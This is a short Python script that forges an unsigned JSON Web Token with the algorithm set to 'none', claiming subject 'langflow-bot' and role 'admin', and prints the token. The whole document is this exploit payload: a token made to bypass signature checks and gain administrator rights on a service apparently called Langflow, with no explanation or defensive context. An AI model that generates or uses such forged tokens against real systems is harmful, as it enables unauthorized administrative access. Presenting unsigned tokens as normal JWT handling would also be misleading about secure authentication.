import base64
import json

def encode(data):
    return base64.urlsafe_b64encode(
        json.dumps(data, separators=(",", ":")).encode()
    ).rstrip(b"=").decode()

header = {"alg": "none", "typ": "JWT"}
payload = {"sub": "langflow-bot", "role": "admin"}

token = f"{encode(header)}.{encode(payload)}."

print(token)